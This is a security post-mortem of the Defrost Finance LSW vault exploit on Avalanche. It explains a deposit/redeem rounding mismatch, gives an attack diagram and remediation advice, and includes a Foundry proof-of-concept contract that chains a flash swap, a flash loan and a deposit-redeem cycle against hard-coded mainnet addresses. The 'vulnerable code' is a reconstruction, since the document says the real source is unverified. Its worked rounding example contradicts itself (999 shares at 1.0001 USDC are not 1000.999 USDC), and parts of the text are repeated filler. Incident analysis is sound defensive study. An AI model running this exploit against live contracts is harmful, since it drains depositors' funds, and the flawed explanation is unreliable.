# Defrost (LSW) — deposit()/redeem() Price Mismatch Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | Defrost Finance (LSW) |
| **Chain** | Avalanche |
| **Loss** | Unconfirmed |
| **LSW (Vulnerable Contract)** | [0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96](https://snowtrace.io/address/0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) |
| **USDC** | [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E](https://snowtrace.io/address/0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) |
| **Uniswap V2 Pair** | [0xf4003F4efBE8691B60249E6afbD307aBE7758adb](https://snowtrace.io/address/0xf4003F4efBE8691B60249E6afbD307aBE7758adb) |
| **Root Cause** | LSW's `deposit()` calculates shares using floor rounding while `redeem()` returns assets using ceil rounding, allowing an attacker to always receive more USDC than deposited in a deposit→redeem cycle with the same amount (ERC4626 rounding direction mismatch) |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Defrost_exp.sol) |

---
## 1. Vulnerability Overview

Defrost Finance's LSW (Lending Share Wrapper) contract was an ERC4626-like structure that accepted USDC deposits and issued shares. A mismatch existed between the price used to calculate shares during `deposit()` and the price used to return USDC during `redeem()`. An attacker flash-borrowed USDC from a Uniswap V2 pair, then within the `joeCall()` callback used LSW's `flashLoan()` function to borrow the maximum available USDC. By depositing the borrowed USDC into LSW via `deposit()` to acquire shares and immediately redeeming them via `redeem()`, the attacker received more USDC than the original deposit amount, generating an arbitrage profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable LSW - deposit/redeem price mismatch
contract LSW is ERC4626 {
    // ❌ On deposit: shares over-issued due to floor rounding
    function deposit(uint256 assets, address receiver)
        public override returns (uint256 shares)
    {
        // ❌ convertToShares uses floor (round-down) calculation
        shares = _convertToSharesFloor(assets);
        _mint(receiver, shares);
        USDC.transferFrom(msg.sender, address(this), assets);
    }

    // ❌ On redeem: assets over-returned due to ceil rounding
    function redeem(uint256 shares, address receiver, address owner)
        public override returns (uint256 assets)
    {
        // ❌ convertToAssets uses ceil (round-up) calculation
        assets = _convertToAssetsCeil(shares);
        _burn(owner, shares);
        USDC.transfer(receiver, assets);  // ❌ Can return more than deposited
    }

    // ❌ Price calculation mismatch: deposit(floor) vs redeem(ceil)
    // When 1 share = 1.0001 USDC:
    // deposit(1000 USDC) → 999 shares (floor)
    // redeem(999 shares) → 1000.999 USDC (ceil) → +0.999 USDC profit
}

// ✅ Correct pattern - consistent rounding direction (ERC4626 standard compliant)
contract SafeLSW is ERC4626 {
    // ✅ ERC4626: deposit uses floor, redeem uses floor (unfavorable to depositor)
    function deposit(uint256 assets, address receiver)
        public override returns (uint256 shares)
    {
        shares = _convertToSharesFloor(assets);  // round down
        _mint(receiver, shares);
        asset.transferFrom(msg.sender, address(this), assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        public override returns (uint256 assets)
    {
        assets = _convertToAssetsFloor(shares);  // ✅ round down (standard compliant)
        _burn(owner, shares);
        asset.transfer(receiver, assets);
    }
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable Function** — `deposit()`:
```solidity
// ❌ Root cause: LSW's `deposit()` calculates shares using floor rounding and `redeem()` returns assets using ceil rounding, allowing an attacker to always receive more USDC than deposited in a deposit→redeem cycle with the same amount (ERC4626 rounding direction mismatch)
// Source code unverified — bytecode analysis required
// Vulnerability: LSW's `deposit()` calculates shares using floor rounding and `redeem()` returns assets using ceil rounding, allowing an attacker to always receive more USDC than deposited in a deposit→redeem cycle with the same amount (ERC4626 rounding direction mismatch)
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Swap USDC from Uniswap V2 Pair (triggers joeCall callback)
    │
    ├─[2] Inside joeCall(): query LSW.maxFlashLoan()
    │       Determine maximum flash loan amount available
    │
    ├─[3] Query LSW.flashFee()
    │       Calculate fee amount
    │
    ├─[4] Call LSW.flashLoan(receiver, USDC, maxAmount, "")
    │       Borrow USDC from LSW → onFlashLoan() callback
    │
    ├─[5] Inside onFlashLoan():
    │       └─[5a] USDC → LSW.deposit() → acquire shares
    │               ❌ Shares issued with floor calculation
    │       └─[5b] shares → LSW.redeem() → receive USDC
    │               ❌ Returns more USDC than deposited due to ceil calculation
    │               Profit = ceil(shares) - floor(assets)
    │
    ├─[6] Repay LSW flash loan (principal + fee)
    │
    ├─[7] Repay Uniswap V2 flash swap
    │
    └─[8] Net profit: rounding difference from deposit/redeem cycle
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ILSW {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
    function maxFlashLoan(address token) external view returns (uint256);
    function flashFee(address token, uint256 amount) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IPair {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DefrostExploit is Test {
    ILSW   lsw  = ILSW(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IPair  pair = IPair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);

    function setUp() public {
        vm.createSelectFork("avax", 24_003_940);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);
        // [Step 1] Flash swap USDC from Uniswap V2 pair → triggers joeCall
        pair.swap(1, 0, address(this), abi.encode(true));
        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }

    function joeCall(address, uint256, uint256, bytes calldata) external {
        // [Steps 2~4] Borrow maximum amount via LSW flash loan
        uint256 maxLoan = lsw.maxFlashLoan(address(USDC));
        uint256 fee = lsw.flashFee(address(USDC), maxLoan);

        USDC.approve(address(lsw), type(uint256).max);
        lsw.flashLoan(address(this), address(USDC), maxLoan, "");

        // Repay Uniswap V2
        USDC.transfer(address(pair), 1);
    }

    function onFlashLoan(
        address, address, uint256 amount, uint256 fee, bytes calldata
    ) external returns (bytes32) {
        // [Step 5] Exploit deposit → redeem rounding mismatch
        // ⚡ Profit generated from deposit(floor) → redeem(ceil) difference
        uint256 shares = lsw.deposit(amount, address(this));
        lsw.redeem(shares, address(this), address(this));

        // Repay LSW flash loan (principal + fee)
        USDC.transfer(address(lsw), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC4626 deposit()/redeem() rounding direction mismatch |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Price Calculation Error |
| **Attack Vector** | Uniswap V2 flash swap → LSW `flashLoan()` → `deposit()` (floor) → `redeem()` (ceil) arbitrage |
| **Preconditions** | `deposit()` and `redeem()` rounding directions are inconsistent, generating profit on a round-trip |
| **Impact** | USDC arbitrage profit (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **ERC4626 Standard Rounding Compliance**: `deposit()` and `mint()` should consistently round in the protocol-favorable direction (floor); `redeem()` and `withdraw()` should also consistently round in the protocol-favorable direction (floor).
2. **Rounding Direction Consistency Audit**: Configure rounding directions so that immediately cycling the same amount through a deposit/redeem round-trip always results in a loss to the user (protocol-favorable).
3. **Block deposit/redeem within Flash Loans**: Detect and block the combination of `flashLoan()` + `deposit()` + `redeem()` within the same transaction, or require a minimum holding period.

---
## 7. Lessons Learned

- **ERC4626 Rounding is a Security Issue**: In the ERC4626 standard, rounding direction is not merely a precision concern but a security requirement. Share calculations in `deposit` must always round down (floor), and asset returns in `redeem` must also always round down (floor).
- **Flash Loan + Vault Combination Vulnerability**: When an ERC4626 vault also provides flash loan functionality, an attacker can execute an immediate deposit/redeem cycle using flash-borrowed funds. Even if the rounding error is negligible in a single cycle, it becomes substantial when combined with a large-scale flash loan.
- **Avalanche DeFi Vulnerability**: The same vault price manipulation pattern seen on BSC also occurred in the Avalanche ecosystem. Regardless of chain, vault designs must explicitly verify rounding directions.